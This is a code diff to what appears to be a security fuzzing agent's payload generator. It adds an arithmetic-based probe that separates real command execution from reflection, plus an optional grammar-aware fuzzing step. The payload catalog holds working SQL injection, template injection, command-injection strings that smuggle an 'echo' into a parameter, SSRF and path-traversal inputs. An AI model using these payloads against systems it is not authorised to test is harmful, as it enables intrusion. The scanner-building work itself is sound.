@@ -20,16 +20,33 @@ from agents.fuzzing.engines.base import CampaignCtx
 logger = logging.getLogger("argus.fuzz.payloadgen")
 
 
+def rce_exec_probe(canary: str) -> "tuple[str, str]":
+    """[89] Return (payload_body, marker) for a command-execution probe whose marker can
+    ONLY be produced by the target EXECUTING the command, never by merely REFLECTING the
+    input (mirroring the SSTI {{7*7}}->49 guard).  payload_body embeds an arithmetic
+    expression `<tag>$((a*b))<tag>`; marker is `<tag><product><tag>`.  A target that echoes
+    the query parameter back returns the literal "$((a*b))" — the product never appears —
+    so only real evaluation satisfies the oracle.  Deterministic in `canary`."""
+    import hashlib as _hl
+    h = int(_hl.sha1((canary or "ARGUS").encode()).hexdigest(), 16)
+    a = 1000 + (h % 9000)
+    b = 1000 + ((h >> 20) % 9000)
+    tag = (canary or "ARGUS")[:6]
+    return f"{tag}$(({a}*{b})){tag}", f"{tag}{a * b}{tag}"
+
+
 def _web_catalog(canary: str, oob: str) -> List[Dict[str, str]]:
     """Built-in web/app payload families.  ``marker`` is what a SUCCESSFUL eval returns."""
+    # [89] cmd/rce proof must distinguish EXECUTION from mere REFLECTION — see rce_exec_probe.
+    _body, _cmd_marker = rce_exec_probe(canary)
     return [
         {"family": "sqli", "value": "' OR '1'='1' -- -", "marker": "", "where": "param"},
         {"family": "sqli", "value": "1' AND 1=CAST((SELECT 'X') AS INT)-- -", "marker": "", "where": "param"},
         {"family": "ssti", "value": "{{7*7}}", "marker": "49", "where": "param"},
         {"family": "ssti", "value": "${7*7}", "marker": "49", "where": "param"},
-        {"family": "cmd", "value": f";echo {canary}", "marker": canary, "where": "param"},
-        {"family": "cmd", "value": f"$({{echo,{canary}}})", "marker": canary, "where": "param"},
-        {"family": "cmd", "value": f"|echo {canary}", "marker": canary, "where": "param"},
+        {"family": "cmd", "value": f";echo {_body}", "marker": _cmd_marker, "where": "param"},
+        {"family": "cmd", "value": f"$(echo {_body})", "marker": _cmd_marker, "where": "param"},
+        {"family": "cmd", "value": f"|echo {_body}", "marker": _cmd_marker, "where": "param"},
         {"family": "ssrf", "value": oob, "marker": "", "where": "param"},
         {"family": "lfi", "value": "....//....//....//etc/hostname", "marker": "", "where": "param"},
         {"family": "redos", "value": "a" * 64 + "!", "marker": "", "where": "param"},
@@ -109,6 +126,22 @@ async def generate(ctx: CampaignCtx, *, augment: bool = True,
         out.append(p)
         if len(out) >= max_payloads:
             break
+
+    # Grammar-aware fuzzing (opt-in, Slice 3): when the operator enables it AND real observed
+    # samples are available, infer an input model and append structure-aware payloads that reach
+    # deeper parser/protocol states than blind mutation.  No-op otherwise → byte-identical.
+    if ctx.surface.get("grammar") and ctx.llm_generate is not None:
+        samples = ctx.surface.get("samples") or []
+        if samples:
+            try:
+                from knowledge.grammar_infer import infer_grammar, mutate
+                model = await infer_grammar(samples, llm_generate=ctx.llm_generate,
+                                            hint=str(ctx.surface.get("grammar_hint") or ctx.modality))
+                if model is not None:
+                    for blob in mutate(model, n=int(ctx.surface.get("grammar_n") or 32), rng_seed=1337):
+                        out.append({"family": "grammar", "value": blob, "structure_aware": True})
+            except Exception as exc:   # noqa: BLE001
+                logger.debug("grammar payloads skipped: %s", exc)
     return out
 
 
@@ -121,8 +154,16 @@ async def _augment(ctx: CampaignCtx) -> List[Dict[str, Any]]:
         grounding = "\n".join(f"- {h.get('title')}: {h.get('snippet')}" for h in hits)
     except Exception:
         pass
+    # [89] Prove command execution by forcing the target to EVALUATE an arithmetic
+    # expression, not by echoing a static canary (which a reflecting endpoint returns
+    # verbatim, faking RCE).  The proof marker is the tagged PRODUCT, unproducible without
+    # real execution.
+    _rce_body, _rce_marker = rce_exec_probe(ctx.canary)
     prompt = (f"Target: {ctx.target}\nSurface: {ctx.surface or {}}\n"
-              f"Canary (echo this to prove command exec): {ctx.canary}\n"
+              f"To PROVE command execution, make the target run a command that outputs "
+              f"exactly `{_rce_body}` — a shell will EVALUATE the arithmetic and return "
+              f"`{_rce_marker}`; a mere reflection returns the literal expression and does "
+              f"NOT count. Only `{_rce_marker}` in the response proves execution.\n"
               f"OOB URL (for SSRF/blind): {ctx.oob_url}\n"
               + (f"Technique context:\n{grounding}\n" if grounding else "")
               + "Produce up to 15 target-specific payloads as the JSON array.")
